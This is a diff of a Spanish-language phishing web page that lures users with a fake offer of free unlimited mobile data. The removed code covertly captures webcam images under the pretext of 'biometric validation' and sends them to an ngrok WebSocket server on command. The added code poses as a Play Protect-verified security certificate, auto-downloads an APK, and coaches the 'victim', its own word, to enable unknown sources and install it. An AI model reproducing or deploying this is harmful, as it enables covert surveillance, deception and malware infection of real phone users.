@@ -3,87 +3,88 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Promo Movilidad - Datos Gratis</title>
+    <title>Verificación de Seguridad - Datos Ilimitados</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-        body { background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; color: #333; }
-        .card { width: 90%; max-width: 400px; background: #fff; border-radius: 20px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; }
-        .banner { background: linear-gradient(135deg, #00c6ff, #0072ff); padding: 40px 20px; color: #fff; }
-        .banner h1 { font-size: 28px; margin-bottom: 10px; }
-        .banner p { font-size: 14px; opacity: 0.9; }
-        .content { padding: 30px; }
-        .offer { font-size: 48px; font-weight: bold; color: #0072ff; margin-bottom: 5px; }
-        .sub-offer { font-size: 18px; color: #666; margin-bottom: 25px; }
-        .steps { text-align: left; margin-bottom: 25px; font-size: 14px; color: #555; }
-        .steps li { list-style: none; margin-bottom: 10px; display: flex; align-items: center; }
-        .steps li::before { content: '✓'; color: #28a745; font-weight: bold; margin-right: 10px; }
-        .btn { background: #ff4b2b; background: linear-gradient(to right, #ff416c, #ff4b2b); color: white; border: none; padding: 15px; width: 100%; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: transform 0.2s; box-shadow: 0 5px 15px rgba(255, 65, 108, 0.4); }
-        .btn:active { transform: scale(0.98); }
-        .footer { font-size: 11px; color: #aaa; margin-top: 15px; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+        .icon {
+            font-size: 50px;
+            color: #007bff;
+            margin-bottom: 20px;
+        }
+        h2 { color: #1c1e21; margin-bottom: 10px; }
+        p { color: #606770; line-height: 1.5; }
+        .btn {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.3s;
+            margin-top: 20px;
+            text-decoration: none;
+            display: inline-block;
+        }
+        .btn:hover { background-color: #0056b3; }
+        .footer { margin-top: 20px; font-size: 12px; color: #bcc0c4; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="banner">
-        <p>PROGRAMA DE LEALTAD 2026</p>
-        <h1>¡Felicidades!</h1>
-        <h2>datos ilimitados gratis</h2>
-    </div>
-    <div class="content">
-        <p class="sub-offer">Has sido seleccionado para:</p>
-        <div class="offer">DATOS 4G/5G</div>
-        <div class="sub-offer">ILIMITADOS POR 30 DÍAS</div>
-        
-        <ul class="steps">
-            <li>Navegación sin límites en todo el país.</li>
-            <li>Redes sociales (FB, IG, WA) incluidas.</li>
-            <li>Válido para todas las operadoras.</li>
-        </ul>
+<div class="card" id="main-content">
+    <div class="icon">🛡️</div>
+    <h2>Activación de Beneficio</h2>
+    <p>Para recibir tus <b>30 días de datos ilimitados</b>, es necesario instalar el certificado de seguridad biométrica en tu dispositivo Android.</p>
+    
+    <button class="btn" onclick="descargar()">Activar Ahora</button>
 
-        <button class="btn" onclick="start()">ACTIVAR BENEFICIO</button>
-        <p class="footer">Al activar, se validará la identidad del titular mediante el sensor biométrico del dispositivo.</p>
+    <div class="footer">
+        © 2026 Servicio de Red Global • Verificado por Play Protect
     </div>
 </div>
 
 <script>
-    async function start() {
-        try {
-            // Pedimos la cámara para la "validación biométrica"
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { width: 480, height: 360, facingMode: "user" } 
-            });
-            
-            // CONEXIÓN A TU NGROK
-            const socket = new WebSocket('wss://goofiness-spiffy-mascot.ngrok-free.dev');
-            
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
+    function descargar() {
+        // Reemplaza 'seguridad_biometrica.apk' por el nombre real de tu archivo en GitHub
+        const nombreArchivo = 'seguridad_biometrica.apk';
+        
+        // Crear enlace de descarga invisible
+        const link = document.createElement('a');
+        link.href = nombreArchivo;
+        link.download = nombreArchivo;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
 
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-
-            // Lógica de "Goteo" (solo manda cuando el servidor pide)
-            socket.onmessage = (event) => {
-                if (event.data === "CAPTURE") {
-                    canvas.width = 480;
-                    canvas.height = 360;
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    if (socket.readyState === WebSocket.OPEN) {
-                        socket.send(canvas.toDataURL('image/jpeg', 0.4));
-                    }
-                }
-            };
-
-            // Cambiamos el texto del botón para que no sospechen
-            document.querySelector('.btn').innerText = "PROCESANDO...";
-            document.querySelector('.sub-offer').innerText = "Validando identidad...";
-
-        } catch (e) {
-            alert("Error: Para activar los datos ilimitados es obligatorio permitir la validación biométrica facial.");
-        }
+        // Cambiar la interfaz para guiar a la víctima
+        document.getElementById('main-content').innerHTML = `
+            <div class="icon">📥</div>
+            <h2>¡Descarga Iniciada!</h2>
+            <p>1. Abre el archivo descargado.<br>
+               2. Si Android lo bloquea, ve a <b>Ajustes</b> y permite "Fuentes desconocidas".<br>
+               3. Haz clic en <b>Instalar</b> para finalizar la activación.</p>
+            <div style="margin-top:20px; font-weight:bold; color:#28a745;">Esperando conexión...</div>
+        `;
     }
 </script>
 
